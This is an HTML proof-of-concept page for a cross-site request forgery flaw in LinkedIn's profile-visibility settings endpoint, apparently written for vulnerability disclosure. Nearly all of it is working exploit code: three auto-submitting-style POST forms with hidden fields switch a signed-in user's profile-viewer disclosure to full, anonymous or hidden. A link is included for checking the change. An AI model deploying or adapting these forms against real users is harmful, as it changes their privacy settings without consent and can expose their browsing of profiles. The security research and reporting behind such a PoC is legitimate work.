<!doctype html>
<meta charset="utf-8">
<title>F101 PoC</title>
<style>
 body{font:15px/1.7 system-ui,sans-serif;max-width:520px;margin:60px auto;padding:0 20px}
 button{font:inherit;padding:12px 20px;margin:5px 8px 5px 0;border:1px solid #0a66c2;
        border-radius:6px;background:#fff;color:#0a66c2;cursor:pointer}
 button:hover{background:#eef5fc}
 form{display:inline}
 a{color:#0a66c2}
 p{color:#555}
</style>

<h2>F101 &mdash; CSRF on /psettings/profile-visibility</h2>
<p>Be signed in to LinkedIn, then click. Works in any browser.</p>

<form method="POST" action="https://www.linkedin.com/psettings/profile-visibility">
  <input type="hidden" name="discloseAsProfileViewer" value="DISCLOSE_FULL">
  <button>DISCLOSE_FULL</button>
</form>

<form method="POST" action="https://www.linkedin.com/psettings/profile-visibility">
  <input type="hidden" name="discloseAsProfileViewer" value="DISCLOSE_ANONYMOUS">
  <button>DISCLOSE_ANONYMOUS</button>
</form>

<form method="POST" action="https://www.linkedin.com/psettings/profile-visibility">
  <input type="hidden" name="discloseAsProfileViewer" value="HIDE">
  <button>HIDE</button>
</form>

<p>You will land on a blank LinkedIn page. Press Back, then check the value:<br>
<a href="https://www.linkedin.com/mysettings-api/settingsApiSettingCards/profileViewingOptions" target="_blank">settingsApiSettingCards/profileViewingOptions</a></p>
